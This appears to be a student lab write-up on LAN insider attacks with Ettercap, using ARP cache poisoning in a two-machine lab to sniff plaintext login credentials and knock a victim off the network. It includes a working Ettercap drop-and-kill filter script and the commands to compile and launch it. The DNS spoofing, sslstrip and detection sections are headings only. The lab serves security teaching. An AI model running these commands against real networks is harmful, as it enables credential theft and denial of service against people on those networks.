# LAN based insider attacks


Make use of Ettercap/arpspoof tool to perform ARP Cache Poisoning based attacks in a LAN
environment:

## 1. Perform Password stealing (over plaintext) using ARP Cache Poisoning attacks

For this attack we take 2 systems, 

- Kali (attacker) - 10.0.2.4
- Fedora (victim) - 10.0.2.5

First open `Ettercap` in kali linux

![image](https://user-images.githubusercontent.com/67383098/227707390-3f713cac-ab0d-49cf-b7ff-e9a0eb6071e1.png)

![image](https://user-images.githubusercontent.com/67383098/227707494-dee50bd4-2060-4b37-bc30-cacd7f567ba4.png)

![image](https://user-images.githubusercontent.com/67383098/227707588-259bf7ee-4b21-496f-acd7-bf9524a4b214.png)

![image](https://user-images.githubusercontent.com/67383098/227707616-48f7c6ec-6878-4e60-9140-05e3200411e5.png)

Add the ip address `10.0.2.5` as target.
Go to `MITM` -> select `arp poisoning`

![image](https://user-images.githubusercontent.com/67383098/227707736-b39fa6b7-5042-4297-8b85-0929575b5b16.png)

![image](https://user-images.githubusercontent.com/67383098/227707796-8adc7383-2049-4771-afdc-91a11afa2c4f.png)

Click **OK**. Now attack has started.

On attacker machine, open firefox & go to `testphp.vulnweb.com`

![image](https://user-images.githubusercontent.com/67383098/227707932-689b2035-4be9-4364-ace1-30abbe179712.png)

After we try to login with the credentials, we can see the packet being sniffed by ettercap in our kali attacker machine .

![image](https://user-images.githubusercontent.com/67383098/227708010-ebe6e2e4-8b17-4e59-acb5-67eb593e0326.png)




## 2. Perform Denial of Service (DoS) attacks using ARP Cache Poisoning attacks

Ettercap has many built-in tools to allow all sorts of network activity from sniffing to ARP spoofing. It also has the ability to use filters to focus its activity. For example, we want to block a host from the network, the simplest way to do that is to not allow any packets to be sent to or from the host we wish to block. Ettercap filters allow us to do just that.

#### Wrtiting a filter :

Open a text editor and type the below code . Replace the target IP as `10.0.2.5`.

```
if (ip.src == 'Target IP' || ip.dst == 'Target IP')
{
drop();
kill();
msg("Packet Dropped\n");
}
```
> The scipt sees if the Source IP OR  the Destination IP matches our target. If it does it drops the packet and sents a RST signal to the other machine our target was > attempting to communicate with. It then outputs a message to our screen so we know a Packet Dropped.

#### Compiling the script

To run it and compile our script we simply type: `etterfilter dos.elt -o dos.ef`

Save the file as `dos.elt` in the `/usr/local/share/ettercap`.

#### Starting up ettercap

`ettercap -T -q -F /usr/local/share/ettercap/dos.ef -M ARP /TARGET IP/ //`

where

`-T` - run in Text Mode
`-q` - quiet mode 
`-F` - to load a filter
`-M` - to run a Man in the Middle Attack

#### Attack

`ettercap -T -q -F /usr/local/share/ettercap/dos.ef -M ARP /192.168.1.209/ //`

Our target is now effectively off the network.




## 3. Perform DNS Spoofing attack using ARP Cache Poisoning attacks


## 4. Invoke ‘sslstrip tool’ for stealing passwords from any machine that is connected to a LAN by
stripping the HTTPS connection.

## 5. Use arp_cop and scan_poisoner plugins to learn about the detection of ARP attacks.


Observe the ARP cache table, CAM table, etc., before and after the attack for all the above attacks. Run
Wireshark and observe the traffic patterns before and after the attack
